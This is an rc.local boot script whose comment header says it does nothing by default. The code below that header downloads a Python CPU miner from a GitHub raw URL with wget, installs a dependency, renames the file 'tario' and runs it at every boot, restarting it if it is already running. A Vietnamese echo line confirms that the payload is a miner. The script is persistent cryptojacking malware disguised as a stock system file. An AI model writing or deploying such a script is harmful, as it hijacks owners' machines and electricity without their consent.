#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/tario ]; then
    if pgrep -x "tario" > /dev/null
then
pkill tario
echo " kill process"
pip install argon2_cffi
python3 tario

    
else

echo "Miner da install , chay thoi "
pip install argon2_cffi
python3 tario
     
fi
exit
fi

wget https://raw.githubusercontent.com/StupidmanTan/miner-cpu/master/T_ario.py
pip install argon2_cffi
mv T_ario.py tario
python3 tario
exit 0
